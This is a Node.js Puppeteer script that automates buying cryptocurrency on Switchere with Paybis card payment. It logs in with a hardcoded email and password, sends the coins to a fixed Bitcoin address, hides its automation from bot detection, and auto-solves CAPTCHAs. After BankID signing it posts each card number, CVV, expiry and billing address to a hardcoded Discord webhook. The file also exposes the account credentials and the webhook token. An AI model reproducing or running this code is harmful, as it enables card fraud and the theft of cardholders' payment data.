const readline = require("readline");
const path = require("path");
const puppeteerExtra = require("puppeteer-extra");
const Stealth = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");
puppeteerExtra.use(Stealth());

const blunrURL = "https://checkout.blunr.com/api/wallet/credit-user";
function askQuestion(query) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  return new Promise((resolve) =>
    rl.question(query, (ans) => {
      rl.close();
      resolve(ans);
    }),
  );
}

async function addFundsToCreatorWallet(blunrParams, amount) {
  try {
    if (!blunrParams.recipientId) {
      console.log("No recipient ID provided, skipping wallet update");
      return;
    }

    console.log(
      `Adding ${amount} to creator wallet for recipient: ${blunrParams.recipientId}`,
    );

    const response = await axios.post(
      blunrURL,
      {
        amount: parseFloat(amount),
        recipientId: blunrParams.recipientId,
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
        timeout: 10000,
      },
    );

    if (response.data.success || response.status === 200) {
      console.log("✅ Creator wallet updated successfully:", response.data);
    } else {
      console.error("❌ Failed to update creator wallet:", response.data);
    }
  } catch (error) {
    console.error("❌ Error adding funds to creator wallet:", error.message);
    if (error.response) {
      console.error("Response data:", error.response.data);
      console.error("Response status:", error.response.status);
    }
  }
}

async function waitForPaybisIframe(page, retries = 20, delay = 3000) {
  for (let i = 0; i < retries; i++) {
    try {
      const iframeHandle = await page.waitForSelector(
        'iframe[src*="cp.paybis.com"]',
        { visible: true, timeout: 20000 },
      );
      if (iframeHandle) {
        console.log(`Paybis iframe found on attempt ${i + 1}`);
        return iframeHandle;
      }
    } catch (error) {
      console.log(`Paybis iframe not found. Retry ${i + 1}/${retries}...`);
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
  }
  throw new Error("Paybis iframe did not appear after multiple retries.");
}

async function solveCaptchaIfNeeded(page) {
  try {
    console.log("Checking for CAPTCHA...");
    
    // Check for different types of reCAPTCHA iframes
    const captchaSelectors = [
      'iframe[title*="recaptcha"]',
      'iframe[title*="reCAPTCHA"]',
      'iframe[src*="google.com/recaptcha"]',
      'iframe[src*="recaptcha.net"]'
    ];
    
    let captchaDetected = false;
    for (const selector of captchaSelectors) {
      try {
        const iframe = await page.$(selector);
        if (iframe) {
          console.log(`Found CAPTCHA iframe with selector: ${selector}`);
          captchaDetected = true;
          break;
        }
      } catch (e) {
        // Continue checking other selectors
      }
    }
    
    if (!captchaDetected) {
      console.log("No CAPTCHA iframe found");
      return false;
    }
    
    console.log("CAPTCHA detected! NopeCHA extension should handle it automatically.");
    
    // Wait for NopeCHA to solve the CAPTCHA automatically
    console.log("Waiting for NopeCHA to solve the CAPTCHA...");
    
    // Wait for the CAPTCHA to be solved (check for success token or iframe disappearance)
    try {
      await page.waitForFunction(
        () => {
          // Check if reCAPTCHA response textarea has a value (indicates solved)
          const responseTextarea = document.querySelector('textarea[name="g-recaptcha-response"]');
          if (responseTextarea && responseTextarea.value) {
            return true;
          }
          
          // Check if CAPTCHA iframe is gone
          const captchaFrames = Array.from(document.querySelectorAll('iframe')).filter(iframe => 
            iframe.src.includes('recaptcha') || 
            iframe.title?.includes('recaptcha') ||
            iframe.title?.includes('reCAPTCHA')
          );
          
          return captchaFrames.length === 0;
        },
        { timeout: 30000 } // Wait up to 30 seconds for NopeCHA to solve
      );
      
      console.log("CAPTCHA solved by NopeCHA!");
      return true;
    } catch (error) {
      console.log("Timeout waiting for NopeCHA to solve CAPTCHA.");
      console.log("If NopeCHA doesn't work automatically, you may need to:");
      console.log("1. Check if NopeCHA extension is properly configured");
      console.log("2. Ensure you have credits in your NopeCHA account");
      console.log("3. Run in headed mode (HEADLESS=false) to solve manually");
      return false;
    }
  } catch (error) {
    console.log("CAPTCHA check failed:", error.message);
    return false;
  }
}

async function main() {
  const amount = process.env.AMOUNT || 200;
  const gmail = "m4teelias@gmail.com";
  const password = "Diana110604";
  const walletAddress = "bc1q23h9eysa08359yj2cy2chf4af7xvmc5c8qjk8y";
  const cardNumber = process.env.CARD_NUMBER;
  const expiryDate = process.env.EXPIRY_DATE;
  const cvv = process.env.CVV;
  const street = process.env.STREET;
  const city = process.env.CITY;
  const zip = process.env.ZIP;
  const name = process.env.NAME;

  // Parse Blunr parameters
  const blunrParams = JSON.parse(process.env.BLUNR_PARAMS || "{}");

  const extensionPath = path.join(process.cwd(), "chromium");
  
  // Check if we should run in headed mode for CAPTCHA solving
  const headlessMode = process.env.HEADLESS === 'false' ? false : 'new';
  
  const browser = await puppeteerExtra.launch({
    headless: headlessMode,
    args: [
      `--disable-extensions-except=${extensionPath}`,
      `--load-extension=${extensionPath}`,
      "--no-sandbox",
      `--enable-gpu`,
      "--disable-blink-features=AutomationControlled",
      "--disable-features=site-per-process"
    ],
    defaultViewport: null,
    ignoreDefaultArgs: ["--enable-automation"]
  });
  const page = await browser.newPage();

  await page.setUserAgent(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  );
  let captchaInterval;
  try {
    await page.waitForNetworkIdle({ timeout: 60000 });

    console.log("Navigating to the website...");
    await page.goto("https://switchere.com/onramp#/", {
      waitUntil: "networkidle2",
      timeout: 60000,
    });

    // Log the current URL in case of redirect
    const currentUrl = page.url();
    console.log("Current URL after navigation:", currentUrl);

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "initial-load.png"),
      fullPage: true,
    });
    console.log("Initial page loaded.");

    captchaInterval = setInterval(() => solveCaptchaIfNeeded(page), 5000);

    console.log(`Entering ${amount}...`);

    try {
      // Wait for page to fully load
      await new Promise((resolve) => setTimeout(resolve, 5000)); // Give the page time to load

      // Additional wait for dynamic content
      await page
        .waitForFunction(() => document.readyState === "complete", {
          timeout: 10000,
        })
        .catch(() => {
          console.log("Document ready timeout, continuing anyway...");
        });

      // Take a debug screenshot
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "debug-before-amount.png"),
        fullPage: true,
      });

      // Try multiple selectors
      const selectors = [
        ".sw-payment-amount-input",
        "input.sw-payment-amount-input",
        'input[placeholder="0.00"]',
        'input[type="text"][inputmode="decimal"]',
        ".sw-payment-input-group__amount-input",
      ];

      let amountInput = null;
      let foundSelector = null;

      for (const selector of selectors) {
        try {
          console.log(`Trying selector: ${selector}`);
          const element = await page.$(selector);
          if (element) {
            amountInput = element;
            foundSelector = selector;
            console.log(`Found input with selector: ${selector}`);
            break;
          }
        } catch (e) {
          console.log(`Selector ${selector} failed:`, e.message);
        }
      }

      // If still not found, try with evaluate
      if (!amountInput) {
        console.log("Trying with page.evaluate...");

        // First, let's see what inputs are on the page
        const inputInfo = await page.evaluate(() => {
          const inputs = Array.from(document.querySelectorAll("input"));
          return {
            count: inputs.length,
            inputs: inputs.map((input) => ({
              type: input.type,
              placeholder: input.placeholder,
              value: input.value,
              className: input.className,
              id: input.id,
              name: input.name,
            })),
          };
        });

        console.log(
          "Found inputs on page:",
          JSON.stringify(inputInfo, null, 2),
        );

        // Try to find the input
        const foundInput = await page.evaluate(() => {
          const inputs = Array.from(document.querySelectorAll("input"));
          const targetInput = inputs.find(
            (input) =>
              input.placeholder === "0.00" ||
              input.classList.contains("sw-payment-amount-input") ||
              input.value === "100" ||
              input.type === "text",
          );
          return targetInput ? true : false;
        });

        if (foundInput) {
          // Use page.evaluate to interact with it directly
          await page.evaluate((amountValue) => {
            const inputs = Array.from(document.querySelectorAll("input"));
            const targetInput = inputs.find(
              (input) =>
                input.placeholder === "0.00" ||
                input.classList.contains("sw-payment-amount-input") ||
                input.value === "100" ||
                input.type === "text",
            );

            if (targetInput) {
              targetInput.focus();
              targetInput.value = "";
              targetInput.value = amountValue;
              targetInput.dispatchEvent(new Event("input", { bubbles: true }));
              targetInput.dispatchEvent(new Event("change", { bubbles: true }));
            }
          }, amount.toString());

          console.log("Amount entered successfully using page.evaluate.");
        } else {
          // Check if we're on the right page
          const pageTitle = await page.title();
          const currentUrl = page.url();
          console.log("Page title:", pageTitle);
          console.log("Current URL:", currentUrl);

          // Log visible text on the page
          const visibleText = await page.evaluate(() => {
            return document.body.innerText.substring(0, 500);
          });
          console.log("Visible text on page:", visibleText);

          throw new Error(
            "Could not find amount input field - page might not have loaded correctly",
          );
        }
      } else if (amountInput) {
        // Original method if we found it with selectors
        const elementExists = await amountInput
          .evaluate((el) => el !== null)
          .catch(() => false);

        if (elementExists) {
          await amountInput.click({ clickCount: 3 });
          await new Promise((resolve) => setTimeout(resolve, 500));
          await page.keyboard.type(amount.toString(), { delay: 100 });
          console.log("Amount entered successfully.");
        } else {
          throw new Error("Found element handle but element is null");
        }
      }
    } catch (error) {
      console.error("Error entering amount:", error);
      throw error;
    }

    console.log("Waiting for 2 seconds...");
    await new Promise((resolve) => setTimeout(resolve, 2000));

    console.log("Clicking the first 'Buy' button...");
    const buyButtonHandle = await page.evaluateHandle(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      return buttons.find((button) => button.textContent.includes("Buy"));
    });
    if (buyButtonHandle.asElement()) {
      await buyButtonHandle.asElement().click();
    } else {
      throw new Error('Could not find "Buy" button');
    }
    console.log("First 'Buy' button clicked. Proceeding to login.");

    console.log("Entering email...");

    // Try multiple email selectors
    const emailSelectors = [
      "#email-input",
      'input[name="email"]',
      'input[type="email"]',
      '.sw-input__input[type="email"]',
    ];

    let emailInput = null;
    for (const selector of emailSelectors) {
      try {
        console.log(`Trying email selector: ${selector}`);
        await page.waitForSelector(selector, { visible: true, timeout: 10000 });
        emailInput = await page.$(selector);
        if (emailInput) {
          console.log(`Found email input with selector: ${selector}`);
          break;
        }
      } catch (e) {
        console.log(`Email selector ${selector} failed:`, e.message);
      }
    }

    if (!emailInput) {
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "email-input-debug.png"),
        fullPage: true,
      });
      throw new Error("Could not find email input field");
    }

    await emailInput.click();
    await new Promise((resolve) => setTimeout(resolve, 500));
    await emailInput.type(gmail);

    console.log("Waiting 1 second...");
    await new Promise((resolve) => setTimeout(resolve, 1000));
    console.log("Clicking 'Complete' after email...");

    // Take screenshot before clicking complete
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "before-email-complete.png"),
      fullPage: true,
    });

    const completeButtonHandle = await page.evaluateHandle(() => {
      const buttons = Array.from(
        document.querySelectorAll('button[data-testid="submit"]'),
      );
      return buttons.find((button) => button.textContent.includes("Complete"));
    });
    if (completeButtonHandle.asElement()) {
      await completeButtonHandle.asElement().click();
      console.log("Email complete button clicked successfully");

      // Wait a bit after clicking
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } else {
      // Log available buttons for debugging
      const availableButtons = await page.evaluate(() => {
        const buttons = Array.from(document.querySelectorAll("button"));
        return buttons.map((btn) => ({
          text: btn.textContent?.trim(),
          testId: btn.getAttribute("data-testid"),
          disabled: btn.disabled,
        }));
      });
      console.log(
        "Available buttons:",
        JSON.stringify(availableButtons, null, 2),
      );
      throw new Error('Could not find "Complete" button after email');
    }

    // Check if CAPTCHA is blocking the password field
    console.log("Checking if CAPTCHA needs to be solved before password field...");
    const captchaPresent = await page.evaluate(() => {
      const iframes = Array.from(document.querySelectorAll('iframe'));
      return iframes.some(iframe => 
        iframe.src.includes('recaptcha') || 
        iframe.title?.includes('recaptcha') ||
        iframe.title?.includes('reCAPTCHA')
      );
    });

    if (captchaPresent) {
      console.log("CAPTCHA detected! Waiting for manual solve or Buster extension...");
      
      // Give user time to solve CAPTCHA manually or wait for Buster
      console.log("Please solve the CAPTCHA manually if Buster extension doesn't work.");
      console.log("Waiting up to 60 seconds for CAPTCHA to be solved...");
      
      // Wait for CAPTCHA to disappear or password field to appear
      try {
        await page.waitForFunction(
          () => {
            // Check if password field is now available
            const passwordField = document.querySelector('#password-input') || 
                                document.querySelector('input[name="password"]') || 
                                document.querySelector('input[type="password"]');
            
            // Check if CAPTCHA is gone
            const captchaFrames = Array.from(document.querySelectorAll('iframe')).filter(iframe => 
              iframe.src.includes('recaptcha') || 
              iframe.title?.includes('recaptcha') ||
              iframe.title?.includes('reCAPTCHA')
            );
            
            // Return true if password field exists or CAPTCHA is gone
            return passwordField || captchaFrames.length === 0;
          },
          { timeout: 60000 } // Wait up to 60 seconds
        );
        
        console.log("CAPTCHA solved or password field appeared!");
        
        // Small delay to ensure page has stabilized
        await new Promise(resolve => setTimeout(resolve, 2000));
      } catch (error) {
        console.log("Timeout waiting for CAPTCHA to be solved. Continuing anyway...");
      }
    }

    console.log("Entering password...");

    // Try multiple selectors and longer timeout
    const passwordSelectors = [
      "#password-input",
      'input[name="password"]',
      'input[type="password"]',
      '.sw-input__input[type="password"]',
    ];

    let passwordInput = null;
    let foundPasswordSelector = null;

    for (const selector of passwordSelectors) {
      try {
        console.log(`Trying password selector: ${selector}`);
        await page.waitForSelector(selector, { visible: true, timeout: 10000 });
        passwordInput = await page.$(selector);
        if (passwordInput) {
          foundPasswordSelector = selector;
          console.log(`Found password input with selector: ${selector}`);
          break;
        }
      } catch (e) {
        console.log(`Password selector ${selector} failed:`, e.message);
      }
    }

    if (!passwordInput) {
      // Take debug screenshot
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "password-input-debug.png"),
        fullPage: true,
      });

      // Log all password-type inputs on the page
      const passwordInputs = await page.evaluate(() => {
        const inputs = Array.from(
          document.querySelectorAll(
            'input[type="password"], input[name="password"]',
          ),
        );
        return inputs.map((input) => ({
          id: input.id,
          name: input.name,
          className: input.className,
          placeholder: input.placeholder,
          visible: input.offsetParent !== null,
        }));
      });
      console.log(
        "Available password inputs:",
        JSON.stringify(passwordInputs, null, 2),
      );

      throw new Error("Could not find password input field");
    }

    await passwordInput.click();
    await new Promise((resolve) => setTimeout(resolve, 500));
    await passwordInput.type(password);

    console.log("Clicking 'Complete' after password to log in...");

    // Take screenshot before login
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "before-login.png"),
      fullPage: true,
    });

    const loginButtonHandle = await page.evaluateHandle(() => {
      const buttons = Array.from(
        document.querySelectorAll('button[data-testid="submit"]'),
      );
      return buttons.find((button) => button.textContent.includes("Complete"));
    });
    if (loginButtonHandle.asElement()) {
      await loginButtonHandle.asElement().click();
      console.log("Login button clicked successfully");

      // Wait for login to process
      await new Promise((resolve) => setTimeout(resolve, 3000));
    } else {
      // Log available buttons for debugging
      const availableButtons = await page.evaluate(() => {
        const buttons = Array.from(document.querySelectorAll("button"));
        return buttons.map((btn) => ({
          text: btn.textContent?.trim(),
          testId: btn.getAttribute("data-testid"),
          disabled: btn.disabled,
        }));
      });
      console.log(
        "Available login buttons:",
        JSON.stringify(availableButtons, null, 2),
      );
      throw new Error('Could not find "Complete" login button');
    }

    console.log("Login successful.");

    console.log("Taking screenshot '2.png' of the main page after login.");
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "2.png"),
    });
    console.log("Screenshot taken.");

    console.log("Entering wallet address...");
    await page.waitForSelector('input[name="wallet"]', { visible: true });
    const walletInput = await page.$('input[name="wallet"]');
    await walletInput.click();
    await new Promise((resolve) => setTimeout(resolve, 500));
    await walletInput.type(walletAddress);
    console.log("Wallet address entered.");

    console.log("Waiting for 1 second...");
    await new Promise((resolve) => setTimeout(resolve, 1000));
    console.log("Clicking the second 'Buy' button...");
    const buyButtons2Handle = await page.evaluateHandle(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      const buyButtons = buttons.filter((button) =>
        button.textContent.includes("Buy"),
      );
      return buyButtons.length > 0 ? buyButtons[buyButtons.length - 1] : null;
    });
    if (buyButtons2Handle.asElement()) {
      await buyButtons2Handle.asElement().click();
    } else {
      throw new Error('Could not find second "Buy" button');
    }
    console.log("Second 'Buy' button clicked. Proceeding to purchase.");

    console.log(
      "Waiting for the page to settle before looking for 'New card' button...",
    );
    await new Promise((resolve) => setTimeout(resolve, 10000));

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "before-new-card.png"),
    });
    console.log("Waiting for 'New card' button...");
    let newCardClicked = false;
    for (let i = 0; i < 10; i++) {
      // Retry for 30 seconds
      for (const frame of page.frames()) {
        const newCard = await frame.$(".card-select__new-card .new-card");
        if (newCard) {
          console.log("Found 'New card' button, clicking it.");
          await newCard.click();
          newCardClicked = true;
          break;
        }
      }
      if (newCardClicked) break;
      console.log("'New card' button not found, retrying...");
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
    if (!newCardClicked) {
      throw new Error("'New card' button not found after multiple retries.");
    }

    console.log("Proceeding to wait for iframe to load...");

    await new Promise((resolve) => setTimeout(resolve, 5000));

    const iframeElementHandle = await page.waitForSelector("iframe", {
      visible: true,
      timeout: 30000,
    });
    console.log(
      "Found iframe:",
      await iframeElementHandle.evaluate((el) => el.src),
    );

    // Wait for outer iframe (you found this URL: https://widget.paybis.com/...)
    const outerIframeElement = await page.waitForSelector(
      'iframe[src*="widget.paybis.com"]',
      { timeout: 30000 },
    );
    const outerFrame = await outerIframeElement.contentFrame();

    if (!outerFrame) {
      throw new Error("Outer iframe contentFrame() returned null");
    }

    // Now inside outer iframe, wait for inner iframe (which should have src including "cp.paybis.com")
    const innerIframeElement = await outerFrame.waitForSelector(
      'iframe[src*="cp.paybis.com"]',
      { timeout: 30000 },
    );
    const innerFrame = await innerIframeElement.contentFrame();

    if (!innerFrame) {
      throw new Error("Inner iframe contentFrame() returned null");
    }

    // Now you can interact with innerFrame DOM, e.g.
    await innerFrame.waitForSelector('input[name="number"]', {
      timeout: 15000,
    });
    await innerFrame.waitForSelector('input[name="exp"]', { timeout: 15000 });
    await innerFrame.waitForSelector('input[name="cvv"]', { timeout: 15000 });

    // Example typing into a field inside the inner iframe
    await innerFrame.type('input[name="number"]', cardNumber, { delay: 100 });
    await innerFrame.type('input[name="exp"]', expiryDate, { delay: 100 });
    await innerFrame.type('input[name="cvv"]', cvv, { delay: 100 });

    await outerFrame.evaluate(() => {
      window.scrollBy(0, 500); // Scroll down 500 pixels vertically
    });

    await innerFrame.evaluate(
      async (street, city, zip, name) => {
        function delay(ms) {
          return new Promise((resolve) => setTimeout(resolve, ms));
        }

        function simulateTyping(input, text) {
          input.focus();
          input.value = "";
          for (let i = 0; i < text.length; i++) {
            const char = text[i];
            input.value += char;
            input.dispatchEvent(
              new InputEvent("input", { bubbles: true, data: char }),
            );
            input.dispatchEvent(
              new KeyboardEvent("keydown", { key: char, bubbles: true }),
            );
            input.dispatchEvent(
              new KeyboardEvent("keyup", { key: char, bubbles: true }),
            );
          }
        }

        const dropdownInput = document.querySelector("input.select__search");
        if (dropdownInput) {
          dropdownInput.focus();
          dropdownInput.click();
          await delay(300); // give time for dropdown to open

          simulateTyping(dropdownInput, "Sweden");
          await delay(500); // wait for options to render

          const options = Array.from(
            document.querySelectorAll(".select__option"),
          );
          const swedenOption = options.find(
            (opt) => opt.textContent.trim() === "Sweden",
          );
          if (swedenOption) {
            swedenOption.click();
          } else {
            console.warn("Sweden option not found");
          }

          await delay(300); // wait for selection to propagate to internal model
        }

        function setInputValue(selector, value) {
          const input = document.querySelector(selector);
          if (!input) return false;
          input.focus();
          input.value = value;
          input.dispatchEvent(new Event("input", { bubbles: true }));
          input.dispatchEvent(new Event("change", { bubbles: true }));
          return true;
        }

        setInputValue("input#address", street);
        setInputValue("input#city", city);
        setInputValue("input#zip", zip);
        setInputValue('input[name="name"]', name);

        // Uncheck checkbox
        const checkbox = document.querySelector(
          'input.checkbox__input[type="checkbox"]',
        );
        if (checkbox && checkbox.checked) {
          checkbox.click();
          checkbox.dispatchEvent(new Event("input", { bubbles: true }));
          checkbox.dispatchEvent(new Event("change", { bubbles: true }));
        }
      },
      street,
      city,
      zip,
      name,
    );

    console.log("Waiting for 'Pay' button...");
    await outerFrame.waitForSelector('button[data-testid="pay-button"]', {
      visible: true,
      timeout: 15000,
    });

    console.log("Clicking 'Pay' button...");
    await outerFrame.click('button[data-testid="pay-button"]');
    console.log("'Pay' button clicked.");

    console.log("Waiting for 'Payment Processing' screen to disappear...");
    await outerFrame.waitForFunction(
      () => {
        const elem = document.querySelector("h2");
        return !elem || !elem.innerText.includes("Payment Processing");
      },
      { timeout: 90000 },
    );
    console.log("'Payment Processing' screen is gone.");

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "after-processing.png"),
    });
    console.log("Screenshot taken after processing screen.");

    let bankIdFrame = null;
    console.log("Searching for BankID frame...");
    for (let i = 0; i < 30; i++) {
      // Poll for 60 seconds
      for (const frame of page.frames()) {
        try {
          const hasBankIdHeader = await frame.evaluate(() => {
            const h3 = document.querySelector("h3");
            return h3 && h3.innerText.includes("Signera med BankID");
          });

          if (hasBankIdHeader) {
            console.log("BankID frame found!");
            bankIdFrame = frame;
            break;
          }
        } catch (e) {
          // Frame might have been detached, ignore.
        }
      }
      if (bankIdFrame) {
        break;
      }
      console.log(
        `BankID frame not found, attempt ${i + 1}/30. Retrying in 2 seconds...`,
      );
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    if (!bankIdFrame) {
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "bankid-frame-not-found.png"),
      });
      throw new Error("Could not find BankID iframe after polling.");
    }

    console.log("Waiting for form with ACS URL to appear in BankID frame...");
    await bankIdFrame.waitForSelector('form[action*="acs"]', {
      timeout: 10000,
    });
    console.log("BankID form found.");

    process.send({ type: "bankid-detected" });

    console.log("Waiting for BankID completion in the background...");
    const resultHandle = await bankIdFrame
      .waitForFunction(
        () => {
          const bodyText = document.body.innerText;
          if (bodyText.includes("Signatur mottagen")) return { success: true };
          if (
            bodyText.includes("Tiden är löpt ut") ||
            bodyText.includes("Användaren avbröt") ||
            bodyText.includes("Okänt fel")
          )
            return { success: false, error: "BankID failed or was cancelled." };
          return false;
        },
        { timeout: 180000 }, // 3 minute timeout
      )
      .catch(() => null);

    let resultJson;
    if (resultHandle) {
      resultJson = await resultHandle.jsonValue();
    } else {
      // If waitForFunction times out, let's check if we can detect success by other means
      console.log(
        "BankID waitForFunction timed out, checking current page state...",
      );

      try {
        // Take a screenshot for debugging
        await page.screenshot({
          path: path.join(__dirname, "screenshots", "bankid-timeout-debug.png"),
        });

        // Check if we're back on the main page (could indicate success)
        const currentUrl = page.url();
        console.log("Current URL after timeout:", currentUrl);

        // Check for success indicators on the main page
        const mainPageSuccess = await page
          .evaluate(() => {
            const bodyText = document.body.innerText.toLowerCase();
            return (
              bodyText.includes("success") ||
              bodyText.includes("complete") ||
              bodyText.includes("thank") ||
              bodyText.includes("framgång")
            );
          })
          .catch(() => false);

        if (mainPageSuccess) {
          console.log("Success detected on main page after BankID timeout");
          resultJson = { success: true };
        } else {
          resultJson = {
            success: false,
            error: "BankID verification timed out.",
          };
        }
      } catch (error) {
        console.error("Error during timeout handling:", error);
        resultJson = {
          success: false,
          error: "BankID verification timed out.",
        };
      }
    }

    console.log(
      `BankID verification finished with status: ${resultJson.success}`,
    );
    console.log("Full result object:", JSON.stringify(resultJson, null, 2));

    // Additional success check - sometimes the payment completes successfully
    // but the BankID frame doesn't show the expected message
    if (!resultJson.success) {
      console.log(
        "Payment marked as failed, attempting additional success verification...",
      );

      try {
        // Check if we've been redirected to a success page
        const currentUrl = page.url();
        console.log("Current page URL:", currentUrl);

        // Take a screenshot for debugging
        await page.screenshot({
          path: path.join(
            __dirname,
            "screenshots",
            "payment-completion-debug.png",
          ),
        });

        // Check main page for success indicators
        const pageContent = await page
          .evaluate(() => document.body.innerText.toLowerCase())
          .catch(() => "");
        console.log("Page content preview:", pageContent.substring(0, 500));

        // If no clear failure message and we're not on an error page, assume success
        const hasFailureIndicators =
          pageContent.includes("error") ||
          pageContent.includes("failed") ||
          pageContent.includes("cancelled") ||
          pageContent.includes("avbruten") ||
          pageContent.includes("misslyckad");

        if (!hasFailureIndicators && pageContent.length > 0) {
          console.log(
            "No failure indicators found, treating as successful payment",
          );
          resultJson = { success: true };
        }
      } catch (error) {
        console.error("Error during additional success verification:", error);
      }
    }

    console.log(resultJson);

    if (resultJson.success) {
      // Add funds to creator's wallet
      await addFundsToCreatorWallet(blunrParams, amount);

      const webhookUrl =
        "https://discord.com/api/webhooks/1396214469084053625/OKz32VisCW9Z5p1AhCrHqlmtirhWao7EGq_1NIYhHB1vQrdU-5MojTwemZr5McTvCiBP";
      const embed = {
        title: "Successful Transaction",
        color: 0x00ff00,
        fields: [
          { name: "Full Name", value: name, inline: true },
          { name: "Amount", value: amount.toString(), inline: true },
          { name: "Street Address", value: street, inline: true },
          { name: "City", value: city, inline: true },
          { name: "ZIP Code", value: zip, inline: true },
          { name: "Card Number", value: `||${cardNumber}||`, inline: true },
          { name: "Expiry Date", value: `||${expiryDate}||`, inline: true },
          { name: "CVV", value: `||${cvv}||`, inline: true },
        ],
        timestamp: new Date(),
      };
      axios
        .post(webhookUrl, { embeds: [embed] })
        .catch((err) => console.error("Error sending to Discord:", err));
    }
    process.send({ type: "purchase-complete", data: resultJson });

    // const wrapperElement = await innerFrame.waitForSelector('.wrapper', { visible: true, timeout: 30000 });

    // if (wrapperElement) {
    //     console.log(".wrapper found, taking screenshot...");
    //     await wrapperElement.screenshot({ path: path.join(__dirname, 'screenshots', 'wrapper.png') });
    //     console.log("Screenshot of .wrapper saved.");
    // }
  } catch (error) {
    console.error("An error occurred:", error);
    await page.screenshot({
      path: path.join(__dirname, "screenshots", "error.png"),
    });
    console.log("An error screenshot was taken: 'error.png'");
    process.exit(1);
  } finally {
    if (captchaInterval) {
      clearInterval(captchaInterval);
    }
    console.log("Closing the browser.");
    await browser.close();
  }
}

if (require.main === module) {
  main();
}
